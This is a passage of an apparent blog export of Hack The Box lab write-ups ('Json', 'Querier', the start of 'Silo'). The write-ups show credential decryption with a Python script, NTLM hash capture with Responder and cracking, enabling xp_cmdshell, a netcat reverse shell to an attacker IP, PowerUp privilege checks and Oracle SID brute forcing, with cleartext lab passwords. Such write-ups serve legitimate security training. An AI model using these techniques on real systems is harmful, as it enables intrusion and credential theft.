type SyncLocation.exe.config \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;utf-8\u0026#34; ?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;appSettings\u0026gt; \u0026lt;add key=\u0026#34;destinationFolder\u0026#34; value=\u0026#34;ftp://localhost/\u0026#34;/\u0026gt; \u0026lt;add key=\u0026#34;sourcefolder\u0026#34; value=\u0026#34;C:\\inetpub\\wwwroot\\jsonapp\\Files\u0026#34;/\u0026gt; \u0026lt;add key=\u0026#34;user\u0026#34; value=\u0026#34;4as8gqENn26uTs9srvQLyg==\u0026#34;/\u0026gt; \u0026lt;add key=\u0026#34;minute\u0026#34; value=\u0026#34;30\u0026#34;/\u0026gt; \u0026lt;add key=\u0026#34;password\u0026#34; value=\u0026#34;oQ5iORgUrswNRsJKH9VaCw==\u0026#34;\u0026gt;\u0026lt;/add\u0026gt; \u0026lt;add key=\u0026#34;SecurityKey\u0026#34; value=\u0026#34;_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%\u0026#34;/\u0026gt; \u0026lt;/appSettings\u0026gt; \u0026lt;startup\u0026gt; \u0026lt;supportedRuntime version=\u0026#34;v4.0\u0026#34; sku=\u0026#34;.NETFramework,Version=v4.7.2\u0026#34; /\u0026gt; \u0026lt;/startup\u0026gt; \u0026lt;/configuration\u0026gt; Decoding to decode from base64 results in binary stuff It\u0026rsquo;s a .Net executable Let\u0026rsquo;s open it in dnspy └─$ file SyncLocation.exe SyncLocation.exe: PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections The password and user are decrypted using Crypto.Decrypt function If we look at the function we see that The value is decode from base64 THe key is a md5sum of SecurityKey value Then the password is decrypted using the Triple DES algorithm (ECB mode) Let\u0026rsquo;s decrypt import base64 import hashlib from Crypto.Cipher import DES3 def decrypt(value, secret_key): ct = base64.b64decode(value) key = hashlib.md5(secret_key).digest() des = DES3.new(key, DES3.MODE_ECB) return des.decrypt(ct).decode() user = \u0026#34;4as8gqENn26uTs9srvQLyg==\u0026#34; password = \u0026#34;oQ5iORgUrswNRsJKH9VaCw==\u0026#34; secret_key = b\u0026#34;_5TL#+GWWFv6pfT3!GXw7D86pkRRTv+$$tk^cL5hdU%\u0026#34; print(f\u0026#34;Username: {decrypt(user, secret_key)}\u0026#34;) print(f\u0026#34;Password: {decrypt(password, secret_key)}\u0026#34;) └─$ python3 DES-decrypt.py Username: superadmin Password: funnyhtb But they don\u0026rsquo;t work for winrm and psexec └─$ crackmapexec winrm 10.10.10.158 -u superadmin -p funnyhtb SMB 10.10.10.158 5985 JSON [*] Windows 6.3 Build 9600 (name:JSON) (domain:json) HTTP 10.10.10.158 5985 JSON [*] http://10.10.10.158:5985/wsman WINRM 10.10.10.158 5985 JSON [-] json\\superadmin:funnyhtb └─$ impacket-psexec superadmin@10.10.10.158 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation Password: [*] Requesting shares on 10.10.10.158..... [-] share \u0026#39;ADMIN$\u0026#39; is not writable. [-] share \u0026#39;C$\u0026#39; is not writable. But they work for ftp And we have a full disk access to Administrator folder └─$ ftp superadmin@10.10.10.158 Connected to 10.10.10.158. 220-FileZilla Server 0.9.60 beta 220-written by Tim Kosse (tim.kosse@filezilla-project.org) 220 Please visit https://filezilla-project.org/ 331 Password required for superadmin Password: 230 Logged on Remote system type is UNIX. Using binary mode to transfer files. ftp\u0026gt; ls 229 Entering Extended Passive Mode (|||56772|) 150 Opening data channel for directory listing of \u0026#34;/\u0026#34; drwxr-xr-x 1 ftp ftp 0 May 22 2019 AppData drwxr-xr-x 1 ftp ftp 0 May 22 2019 Application Data drwxr-xr-x 1 ftp ftp 0 May 22 2019 Contacts drwxr-xr-x 1 ftp ftp 0 May 22 2019 Cookies drwxr-xr-x 1 ftp ftp 0 Mar 17 2021 Desktop drwxr-xr-x 1 ftp ftp 0 May 22 2019 Documents drwxr-xr-x 1 ftp ftp 0 May 22 2019 Downloads drwxr-xr-x 1 ftp ftp 0 May 22 2019 Favorites drwxr-xr-x 1 ftp ftp 0 May 22 2019 Links drwxr-xr-x 1 ftp ftp 0 May 22 2019 Local Settings drwxr-xr-x 1 ftp ftp 0 May 22 2019 Music drwxr-xr-x 1 ftp ftp 0 May 22 2019 My Documents drwxr-xr-x 1 ftp ftp 0 May 22 2019 NetHood -r--r--r-- 1 ftp ftp 524288 Sep 09 06:07 NTUSER.DAT -r--r--r-- 1 ftp ftp 8192 May 22 2019 ntuser.dat.LOG1 -r--r--r-- 1 ftp ftp 122880 May 22 2019 ntuser.dat.LOG2 -r--r--r-- 1 ftp ftp 65536 May 22 2019 NTUSER.DAT{a8bf096c-714a-11e4-80c0-a4badb286356}.TM.blf -r--r--r-- 1 ftp ftp 524288 May 22 2019 NTUSER.DAT{a8bf096c-714a-11e4-80c0-a4badb286356}.TMContainer00000000000000000001.regtrans-ms -r--r--r-- 1 ftp ftp 524288 May 22 2019 NTUSER.DAT{a8bf096c-714a-11e4-80c0-a4badb286356}.TMContainer00000000000000000002.regtrans-ms -r--r--r-- 1 ftp ftp 20 May 22 2019 ntuser.ini drwxr-xr-x 1 ftp ftp 0 May 22 2019 Pictures drwxr-xr-x 1 ftp ftp 0 May 22 2019 PrintHood drwxr-xr-x 1 ftp ftp 0 May 22 2019 Recent drwxr-xr-x 1 ftp ftp 0 May 22 2019 Saved Games drwxr-xr-x 1 ftp ftp 0 May 22 2019 Searches drwxr-xr-x 1 ftp ftp 0 May 22 2019 SendTo drwxr-xr-x 1 ftp ftp 0 May 22 2019 Start Menu drwxr-xr-x 1 ftp ftp 0 May 22 2019 Templates drwxr-xr-x 1 ftp ftp 0 May 22 2019 Videos 226 Successfully transferred \u0026#34;/\u0026#34; ftp\u0026gt; I got the root flag, so in order to get RCE, we should use Potato ","date":"September 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/json/images/json.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/json/","summary":"Json Enumeration nmap └─$ nmap -Pn -p- 10.10.10.158 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 20:02 BST Stats: 0:03:53 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 45.70% done; ETC: 20:10 (0:04:37 remaining) Nmap scan report for 10.10.10.158 (10.10.10.158) Host is up (0.12s latency). Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5985/tcp open wsman 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49156/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown └─$ nmap -Pn -p21,80,135,139,445,5985 -sC -sV 10.","tags":["HTB","deserialization","dotnet","javascript","deobfuscation","jsnice","oauth","ysoserial.net","filezilla","ftp","dnspy","python","des","crypto","juicypotato","potato"],"title":"[HTB] Machine: Json"},{"categories":null,"contents":"Querier Enumeration nmap └─$ nmap -Pn -p- 10.10.10.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining) Nmap scan report for 10.10.10.125 (10.10.10.125) Host is up (0.15s latency). Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 5985/tcp open wsman 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 693.11 seconds └─$ nmap -Pn -p135,139,445,1433,5985 -sC -sV 10.10.10.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:18 BST Nmap scan report for 10.10.10.125 (10.10.10.125) Host is up (0.13s latency). PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds? 1433/tcp open ms-sql-s Microsoft SQL Server 2017 14.00.1000.00; RTM | ms-sql-ntlm-info: | 10.10.10.125:1433: | Target_Name: HTB | NetBIOS_Domain_Name: HTB | NetBIOS_Computer_Name: QUERIER | DNS_Domain_Name: HTB.LOCAL | DNS_Computer_Name: QUERIER.HTB.LOCAL | DNS_Tree_Name: HTB.LOCAL |_ Product_Version: 10.0.17763 | ms-sql-info: | 10.10.10.125:1433: | Version: | name: Microsoft SQL Server 2017 RTM | number: 14.00.1000.00 | Product: Microsoft SQL Server 2017 | Service pack level: RTM | Post-SP patches applied: false |_ TCP port: 1433 |_ssl-date: 2023-09-06T19:18:33+00:00; -7h00m00s from scanner time. | ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback | Not valid before: 2023-09-06T14:05:43 |_Not valid after: 2053-09-06T14:05:43 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2023-09-06T19:18:24 |_ start_date: N/A |_clock-skew: mean: -7h00m00s, deviation: 0s, median: -7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.61 seconds smb └─$ smbclient -N -L //10.10.10.125 Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC Reports Disk Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.10.125 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available Foothold/User #1 //10.10.10.125/Reports └─$ smbclient -N //10.10.10.125/Reports Try \u0026#34;help\u0026#34; to get a list of possible commands. smb: \\\u0026gt; ls . D 0 Mon Jan 28 23:23:48 2019 .. D 0 Mon Jan 28 23:23:48 2019 Currency Volume Report.xlsm A 12229 Sun Jan 27 22:21:34 2019 5158399 blocks of size 4096. 828878 blocks available smb: \\\u0026gt; get \u0026#34;Currency Volume Report.xlsm\u0026#34; getting file \\Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (23.7 KiloBytes/sec) (average 23.7 KiloBytes/sec) smb: \\\u0026gt; exit We can use oletools to open xlsm file └─$ olevba \u0026#39;Currency Volume Report.xlsm\u0026#39; XLMMacroDeobfuscator: pywin32 is not installed (only is required if you want to use MS Excel) olevba 0.60.1 on Python 3.11.4 - http://decalage.info/python/oletools =============================================================================== FILE: Currency Volume Report.xlsm Type: OpenXML WARNING For now, VBA stomping cannot be detected for files in memory ------------------------------------------------------------------------------- VBA MACRO ThisWorkbook.cls in file: xl/vbaProject.bin - OLE stream: \u0026#39;VBA/ThisWorkbook\u0026#39; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - \u0026#39; macro to pull data for client volume reports \u0026#39; \u0026#39; further testing required Private Sub Connect() Dim conn As ADODB.Connection Dim rs As ADODB.Recordset Set conn = New ADODB.Connection conn.ConnectionString = \u0026#34;Driver={SQL Server};Server=QUERIER;Trusted_Connection=no;Database=volume;Uid=reporting;Pwd=PcwTWTHRwryjc$c6\u0026#34; conn.ConnectionTimeout = 10 conn.Open If conn.State = adStateOpen Then \u0026#39; MsgBox \u0026#34;connection successful\u0026#34; \u0026#39;Set rs = conn.Execute(\u0026#34;SELECT * @@version;\u0026#34;) Set rs = conn.Execute(\u0026#34;SELECT * FROM volume;\u0026#34;) Sheets(1).Range(\u0026#34;A1\u0026#34;).CopyFromRecordset rs rs.Close End If End Sub ------------------------------------------------------------------------------- VBA MACRO Sheet1.cls in file: xl/vbaProject.bin - OLE stream: \u0026#39;VBA/Sheet1\u0026#39; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro) +----------+--------------------+---------------------------------------------+ |Type |Keyword |Description | +----------+--------------------+---------------------------------------------+ |Suspicious|Open |May open a file | |Suspicious|Hex Strings |Hex-encoded strings were detected, may be | | | |used to obfuscate strings (option --decode to| | | |see all) | +----------+--------------------+---------------------------------------------+ Let\u0026rsquo;s connect using impacket-mssqlclient └─$ impacket-mssqlclient reporting:\u0026#39;PcwTWTHRwryjc$c6\u0026#39;@10.10.10.125 -windows-auth Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 32576 [*] INFO(QUERIER): Line 1: Changed database context to \u0026#39;volume\u0026#39;. [*] INFO(QUERIER): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands SQL\u0026gt; User #2 Let\u0026rsquo;s enumerate https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server SQL\u0026gt; SELECT name FROM master.sys.databases; name -------------------------------------------------------------------------------------------------------------------------------- master tempdb model msdb volume SQL\u0026gt; use volume; [*] ENVCHANGE(DATABASE): Old Value: volume, New Value: volume [*] INFO(QUERIER): Line 1: Changed database context to \u0026#39;volume\u0026#39;. SQL\u0026gt; select * from volume.INFORMATION_SCHEMA.TABLES; TABLE_CATALOG TABLE_SCHEMA TABLE_NAME TABLE_TYPE -------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- -------------------------------------------------------------------------------------------------------------------------------- ---------- SQL\u0026gt; SQL\u0026gt; select name from sys.database_principals; name -------------------------------------------------------------------------------------------------------------------------------- public dbo guest INFORMATION_SCHEMA sys reporting db_owner db_accessadmin db_securityadmin db_ddladmin db_backupoperator db_datareader db_datawriter db_denydatareader db_denydatawriter SQL\u0026gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;SERVER\u0026#39;); entity_name permission_name -------------------------------------- ------------------------------------------------------------ server CONNECT SQL server VIEW ANY DATABASE We can try Relay attack to steal NTLM https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server Spawn responder sudo responder -I tun0 xp_dirtree '\\\\10.10.16.9\\share' Let\u0026rsquo;s try cracking the hash └─$ hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting ... Dictionary cache hit: * Filename..: /usr/share/wordlists/rockyou.txt * Passwords.: 14344385 * Bytes.....: 139921507 * Keyspace..: 14344385 MSSQL-SVC::QUERIER:9ff61af2dbedec92:9f2e38090e7e7fcc9c591f15a04e054e:0101000000000000808d4a879fe1d90163787420f91ba8670000000002000800440035003100380001001e00570049004e002d0033004500440034004d00370032004e004e0053004a0004003400570049004e002d0033004500440034004d00370032004e004e0053004a002e0044003500310038002e004c004f00430041004c000300140044003500310038002e004c004f00430041004c000500140044003500310038002e004c004f00430041004c0007000800808d4a879fe1d9010600040002000000080030003000000000000000000000000030000081f3393493531a125c3b622d085b2b4351c099d0ec914204d1ed13d91c0fb76b0a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e003900000000000000000000000000:corporate568 Session..........: hashcat Status...........: Cracked Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: MSSQL-SVC::QUERIER:9ff61af2dbedec92:9f2e38090e7e7fc...000000 Time.Started.....: Thu Sep 7 15:28:07 2023 (8 secs) Time.Estimated...: Thu Sep 7 15:28:15 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 1161.0 kH/s (0.37ms) @ Accel:256 Loops:1 Thr:1 Vec:8 Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new) Progress.........: 8958464/14344385 (62.45%) Rejected.........: 0/8958464 (0.00%) Restore.Point....: 8957952/14344385 (62.45%) Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1 Candidate.Engine.: Device Generator Candidates.#1....: correita.54 -\u0026gt; corp111 Hardware.Mon.#1..: Util: 92% ... Let\u0026rsquo;s connect to mssql using new creds └─$ impacket-mssqlclient mssql-svc:\u0026#39;corporate568\u0026#39;@10.10.10.125 -windows-auth Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 32576 [*] INFO(QUERIER): Line 1: Changed database context to \u0026#39;master\u0026#39;. [*] INFO(QUERIER): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands SQL\u0026gt; SELECT entity_name, permission_name FROM fn_my_permissions(NULL, \u0026#39;SERVER\u0026#39;); entity_name permission_name ------------------ ------------------------------ server CONNECT SQL server SHUTDOWN server CREATE ENDPOINT server CREATE ANY DATABASE server CREATE AVAILABILITY GROUP server ALTER ANY LOGIN server ALTER ANY CREDENTIAL server ALTER ANY ENDPOINT server ALTER ANY LINKED SERVER server ALTER ANY CONNECTION server ALTER ANY DATABASE server ALTER RESOURCES server ALTER SETTINGS server ALTER TRACE server ALTER ANY AVAILABILITY GROUP server ADMINISTER BULK OPERATIONS server AUTHENTICATE SERVER server EXTERNAL ACCESS ASSEMBLY server VIEW ANY DATABASE server VIEW ANY DEFINITION server VIEW SERVER STATE server CREATE DDL EVENT NOTIFICATION server CREATE TRACE EVENT NOTIFICATION server ALTER ANY EVENT NOTIFICATION server ALTER SERVER STATE server UNSAFE ASSEMBLY server ALTER ANY SERVER AUDIT server CREATE SERVER ROLE server ALTER ANY SERVER ROLE server ALTER ANY EVENT SESSION server CONNECT ANY DATABASE server IMPERSONATE ANY LOGIN server SELECT ALL USER SECURABLES server CONTROL SERVER We cant\u0026rsquo; perform xp_cmdshell since it\u0026rsquo;s disabled SQL\u0026gt; xp_cmdshell \u0026#34;whoami\u0026#34; [-] ERROR(QUERIER): Line 1: SQL Server blocked access to procedure \u0026#39;sys.xp_cmdshell\u0026#39; of component \u0026#39;xp_cmdshell\u0026#39; because this component is turned off as part of the security configuration for this server. A system administrator can enable the use of \u0026#39;xp_cmdshell\u0026#39; by using sp_configure. For more information about enabling \u0026#39;xp_cmdshell\u0026#39;, search for \u0026#39;xp_cmdshell\u0026#39; in SQL Server Books Online. We can enable it https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server#execute-os-commands SQL\u0026gt; sp_configure \u0026#39;show advanced options\u0026#39;, \u0026#39;1\u0026#39; [*] INFO(QUERIER): Line 185: Configuration option \u0026#39;show advanced options\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. SQL\u0026gt; RECONFIGURE SQL\u0026gt; sp_configure \u0026#39;xp_cmdshell\u0026#39;, \u0026#39;1\u0026#39; [*] INFO(QUERIER): Line 185: Configuration option \u0026#39;xp_cmdshell\u0026#39; changed from 0 to 1. Run the RECONFIGURE statement to install. SQL\u0026gt; RECONFIGURE SQL\u0026gt; xp_cmdshell \u0026#34;whoami\u0026#34; output -------------------------------------------------------------------------------- querier\\mssql-svc NULL Let\u0026rsquo;s get the reverse shell └─$ impacket-smbserver share $(pwd) -smb2support Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation [*] Config file parsed [*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0 [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0 [*] Config file parsed [*] Config file parsed [*] Config file parsed ... SQL\u0026gt; xp_cmdshell \u0026#34;\\\\10.10.16.9\\share\\nc64.exe 10.10.16.9 6666 -e cmd\u0026#34; Root whoami c:\\Users\u0026gt;whoami /priv whoami /priv PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ======== SeAssignPrimaryTokenPrivilege Replace a process level token Disabled SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled SeChangeNotifyPrivilege Bypass traverse checking Enabled SeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled c:\\Users\u0026gt;whoami /groups whoami /groups GROUP INFORMATION ----------------- Group Name Type SID Attributes ==================================== ================ =============================================================== ================================================== Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group BUILTIN\\Performance Monitor Users Alias S-1-5-32-558 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\SERVICE Well-known group S-1-5-6 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT SERVICE\\MSSQLSERVER Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner LOCAL Well-known group S-1-2-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 SeImpersonatePrivilege is could be Potato privilege escalation path But let\u0026rsquo;s also run PowerUp PS C:\\Users\\mssql-svc\u0026gt; import-module .\\powerup.ps1 import-module .\\powerup.ps1 PS C:\\Users\\mssql-svc\u0026gt; Invoke-AllChecks Invoke-AllChecks Privilege : SeImpersonatePrivilege Attributes : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED TokenHandle : 2812 ProcessId : 3900 Name : 3900 Check : Process Token Privileges ServiceName : UsoSvc Path : C:\\Windows\\system32\\svchost.exe -k netsvcs -p StartName : LocalSystem AbuseFunction : Invoke-ServiceAbuse -Name \u0026#39;UsoSvc\u0026#39; CanRestart : True Name : UsoSvc Check : Modifiable Services ModifiablePath : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps IdentityReference : QUERIER\\mssql-svc Permissions : {WriteOwner, Delete, WriteAttributes, Synchronize...} %PATH% : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps Name : C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps Check : %PATH% .dll Hijacks AbuseFunction : Write-HijackDll -DllPath \u0026#39;C:\\Users\\mssql-svc\\AppData\\Local\\Microsoft\\WindowsApps\\wlbsctrl.dll\u0026#39; UnattendPath : C:\\Windows\\Panther\\Unattend.xml Name : C:\\Windows\\Panther\\Unattend.xml Check : Unattended Install Files Changed : {2019-01-28 23:12:48} UserNames : {Administrator} NewName : [BLANK] Passwords : {MyUnclesAreMarioAndLuigi!!1!} File : C:\\ProgramData\\Microsoft\\Group Policy\\History\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Machine\\Preferences\\Groups\\Groups.xml Check : Cached GPP Files Looks like we have creds in GPP Administrator:MyUnclesAreMarioAndLuigi!!1! So let\u0026rsquo;s get our shell We could also modify service You can check 0xdf ","date":"September 6, 2023","hero":"/posts/cybersecurity/hackthebox/machines/windows/querier/images/querier.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/windows/querier/","summary":"Querier Enumeration nmap └─$ nmap -Pn -p- 10.10.10.125 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 03:05 BST Stats: 0:06:52 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 72.17% done; ETC: 03:15 (0:02:39 remaining) Nmap scan report for 10.10.10.125 (10.10.10.125) Host is up (0.15s latency). Not shown: 65521 closed tcp ports (conn-refused) PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1433/tcp open ms-sql-s 5985/tcp open wsman 47001/tcp open winrm 49664/tcp open unknown 49665/tcp open unknown 49666/tcp open unknown 49667/tcp open unknown 49668/tcp open unknown 49669/tcp open unknown 49670/tcp open unknown 49671/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 693.","tags":["HTB","smb","smbclient","olevba","macros","vba","mssql","mssqlclient","xp-dirtree","net-ntlmv2","responder","hashcat","xp-cmdshell","powerup","gpp","smbserver","psexec","service","impacket"],"title":"[HTB] Machine: Querier"},{"categories":null,"contents":"Silo Enumeration nmap └─$ nmap -Pn -p- 10.10.10.82 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 16:33 BST Warning: 10.10.10.82 giving up on port because retransmission cap hit (6). Stats: 0:09:50 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan Connect Scan Timing: About 83.01% done; ETC: 16:45 (0:02:01 remaining) Nmap scan report for 10.10.10.82 (10.10.10.82) Host is up (0.14s latency). Not shown: 65512 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 1521/tcp open oracle 5985/tcp open wsman 27464/tcp filtered unknown 30480/tcp filtered unknown 36752/tcp filtered unknown 46311/tcp filtered unknown 47001/tcp open winrm 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49159/tcp open unknown 49160/tcp open unknown 49161/tcp open unknown 49162/tcp open unknown 54636/tcp filtered unknown 54826/tcp filtered unknown 63783/tcp filtered unknown 64449/tcp filtered unknown └─$ nmap -Pn -sC -sV 10.10.10.82 -T4 Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-07 16:47 BST Nmap scan report for 10.10.10.82 (10.10.10.82) Host is up (0.13s latency). Not shown: 988 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 8.5 |_http-title: IIS Windows Server | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/8.5 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds 1521/tcp open oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized) 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49159/tcp open oracle-tns Oracle TNS listener (requires service name) 49160/tcp open msrpc Microsoft Windows RPC 49161/tcp open msrpc Microsoft Windows RPC Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: supported |_clock-skew: mean: -37s, deviation: 0s, median: -37s | smb2-time: | date: 2023-09-07T15:49:13 |_ start_date: 2023-09-07T15:31:46 | smb2-security-mode: | 3:0:2: |_ Message signing enabled but not required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 145.51 seconds smb └─$ smbclient -N -L //10.10.10.82 session setup failed: NT_STATUS_ACCESS_DENIED Web Server gobuster └─$ gobuster dir -u http://10.10.10.82/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -x txt,asp,aspx --no-error =============================================================== Gobuster v3.5 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.82/ [+] Method: GET [+] Threads: 50 [+] Wordlist: /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.5 [+] Extensions: asp,aspx,txt [+] Timeout: 10s =============================================================== 2023/09/07 16:59:40 Starting gobuster in directory enumeration mode =============================================================== =============================================================== 2023/09/07 17:03:29 Finished =============================================================== Foothold/User We have Oracle https://ppn.snovvcrash.rocks/pentest/infrastructure/dbms/oracle https://book.hacktricks.xyz/network-services-pentesting/1521-1522-1529-pentesting-oracle-listener#enumeration https://medium.com/@netscylla/pentesters-guide-to-oracle-hacking-1dcf7068d573 Attack steps according to presentatio: Locate Oracle Systems Determine Oracle Version. Determine Oracle SID Guess/Bruteforce USER/PASS Check out the database Privilege Escalation We know the server We can skip 2-nd step Let\u0026rsquo;s find SIDs We can do it using odat, tnscmd10g, msfconsole, hydra └─$ odat sidguesser -s 10.10.10.82 [1] (10.10.10.82:1521): Searching valid SIDs [1.1] Searching valid SIDs thanks to a well known SID list on the 10.10.10.82:1521 server [+] \u0026#39;XE\u0026#39; is a valid SID. Continue... ##################################################################################################################################################################### | ETA: 00:00:02 100% |#####################################################################################################################################################################################################################| Time: 00:03:41 [1.2] Searching valid SIDs thanks to a brute-force attack on 1 chars now (10.10.10.82:1521) 100% |#####################################################################################################################################################################################################################| Time: 00:00:07 [1.3] Searching valid SIDs thanks to a brute-force attack on 2 chars now (10.10.10.82:1521) [+] \u0026#39;XE\u0026#39; is a valid SID. Continue... ############################################################################################################################################### | ETA: 00:00:21 100% |#####################################################################################################################################################################################################################| Time: 00:03:20 [+] SIDs found on the 10.10.10.82:1521 server: XE └─$ hydra -L sids-oracle.txt -s 1521 10.10.10.82 oracle-sid Hydra v9.5 (c) 2023 